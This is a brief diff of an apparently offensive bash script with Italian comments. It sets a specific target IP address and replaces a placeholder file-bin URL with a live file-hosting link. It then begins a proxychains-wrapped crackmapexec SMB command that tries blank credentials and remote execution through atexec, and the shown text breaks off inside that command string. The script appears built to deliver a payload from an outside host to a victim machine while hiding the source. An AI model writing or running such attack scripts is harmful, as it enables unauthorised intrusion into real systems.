@@ -1,6 +1,6 @@
 #!/bin/bash
 TARGET="186.57.237.126"
-EDGEONE_URL="https://filebin.net/IL_TUO_HASH"  # ← CAMBIA QUI!
+EDGEONE_URL="https://www.directfiles.link/RPUVE0X8H"  # ← CAMBIA QUI!
 
 # Deploy + Log
 proxychains4 crackmapexec smb $TARGET -u '' -p '' --exec-method atexec -x "
